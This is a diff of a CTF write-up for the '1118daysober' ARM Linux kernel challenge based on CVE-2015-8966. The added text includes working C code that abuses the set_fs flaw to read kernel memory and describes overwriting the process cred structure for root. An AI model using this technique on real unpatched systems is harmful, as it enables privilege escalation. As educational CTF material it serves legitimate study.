@@ -156,7 +156,7 @@ sh.interactive()
 
 ## 1118daysober
 
-Searching for `CVE-2015-8966`, we can find the patch for this vulnerability [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=76cc404bfdc0d419c720de4daaf2584542734f42). So this is a 32-bit ARM Linux kernel privilege escalation challenge. A `qemu` environment is given. If you want to learn more about kernel exploitation environment configuration, you can read it [here](https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html); the only difference is that this article is about `x86-64` Linux kernel exploitation. After reading and comparing the codes before patch and codes after patch, we can find the only difference: for case `F_OFD_GETLK`,`F_OFD_SETLK` and `F_OFD_SETLKW`, the `fs` is not set back after calling `set_fs(KERNEL_DS)`. So what does this function do? What I've found is this
+Searching for `CVE-2015-8966`, we can find the patch for this vulnerability [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=76cc404bfdc0d419c720de4daaf2584542734f42). So this is a 32-bit ARM Linux kernel privilege escalation challenge. A `qemu` environment is given. If you want to learn more about kernel exploitation environment configuration, you can read it [here](https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html); the only difference is that this article is about `x86-64` Linux kernel exploitation, so we use `gdb-multiarch` and `arm-linux-gnueabi-gcc` instead. After reading and comparing the codes before patch and codes after patch, we can find the only difference: for case `F_OFD_GETLK`,`F_OFD_SETLK` and `F_OFD_SETLKW`, the `fs` is not set back after calling `set_fs(KERNEL_DS)`. So what does this function do? What I've found is this
 
 > The original role of `set_fs()` was to set the `x86` processor's `FS` segment register which, in the early days, was used to control the range of virtual addresses that could be accessed by unprivileged code. The kernel has, of course, long since stopped using `x86` segments this way. In current kernels, `set_fs()` works by setting a global variable called `addr_limit`, but the intended functionality is the same: unprivileged code is only allowed to dereference addresses that are below `addr_limit`. The kernel's `access_ok()` function, used to validate user-space accesses throughout the kernel, is a simple check against `addr_limit`, with the rest of the protection being handled by the processor's memory-management unit. 
 >
@@ -170,4 +170,60 @@ Then I tried to use `fcntl` to trigger the vulnerability, but it fails and the b
 
 But after checking the binary, the `syscall number` is indeed `0xdd`, which got me confused.
 
-Finally, I found the way to trigger the vulnerability [here](https://bbs.pediy.com/thread-214585.htm)\(content in Chinese\). After then, we can use `read` and `write` to access the kernel memory. But note, we cannot use direct access since that is handled by `MMU`. Then we can use//todo
+Finally, I found the way to trigger the vulnerability [here](https://bbs.pediy.com/thread-214585.htm)\(content in Chinese\), which uses `swi` to call `sys_oabi_fcntl64` instead of `svc 0`. After then, we can use `read` and `write` to access the kernel memory. But note, we cannot use direct access since that is handled by `MMU`. Then we can use unnamed pipe or a regular file. But note:
+
+1. after calling `set_fs(KERNEL_DS)`, `read(fd_file_or_pipe, user_addr, size)` will cause kernel panic.
+2. after calling `set_fs(KERNEL_DS)`, `write(fd_file_or_pipe, kernel_unmapped_addr, size)` will also cause kernel panic.
+
+These are 2 problems that got me stuck for many hours. For the first one, we can solve it by calling `fork` and call `set_fs(KERNEL_DS)` for child process only, then `write` in the child process to get kernel data, and call `read` in parent process to receive the kernel data. For the second one, we can use `write(1, kernel_addr, 8)` to try to output the kernel data to `stdout`, which will not cause segmentation fault. Only if it returns `8`, that means that page is mapped so we can write it to pipe without kernel panic. Here is my implementation of `memcpy_kernel_page`, which copy a page from `src`(kernel address) to global variable `page`.
+
+```c
+void error_exit(const char* msg)
+{
+	write(2, msg, strlen(msg));
+	exit(-1);
+}
+ssize_t memcpy_kernel_page(char* src)
+{
+	ssize_t ret;
+	memset(page, 0, PAGE_SIZE);
+	int fd[2];
+	ret = pipe(fd);
+	if (ret < 0) error_exit("pipe failed");
+	pid_t proc = fork();//handle problem 1
+	if (proc < 0) error_exit("fork failed");
+	if (proc == 0)
+	{//child
+		close(fd[0]);
+		set_fs();//trigger vulnerability
+		if (write(1, src, 8) != 8)
+			error_exit("write kmem failed"); //handle problem 2
+		if (write(fd[1], src, PAGE_SIZE) != PAGE_SIZE)
+			error_exit("write kmem failed");
+		close(fd[1]);
+		exit(0);
+	}
+	else
+	{//parent
+		int status;
+		close(fd[1]);
+		wait(&status);
+		if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
+			ret = PAGE_SIZE;
+		else
+			ret = -1;
+		if (read(fd[0], page, PAGE_SIZE) <= 0)
+			error_exit("read kmem failed");
+		close(fd[0]);
+		if (ret > 0)
+			printf("read kernel memory successfully, first QWORD %p, last QWORD %p\n",
+				*(uintptr_t*)page, *(uintptr_t*)(page + PAGE_SIZE - sizeof(uintptr_t)));
+
+		return ret;
+	}
+}
+```
+
+The way to escalate privilege is to write `cred`. Firstly we can find the `cred` by brute force `comm`. The approach is same as the technique used in [stringIPC](https://poppopret.org/2015/11/16/csaw-ctf-2015-kernel-exploitation-challenge/). However, here is where I failed to solve the challenge in CTF: the maximum string length for `comm` is `15` instead of `16`, with a `\x00` added at `index 15`, but I used string length of `16`, which will cause the last byte to be unmatched when using `memmem` to scan the memory!!! :\(
+
+Here is the final [exploit](exp.c).
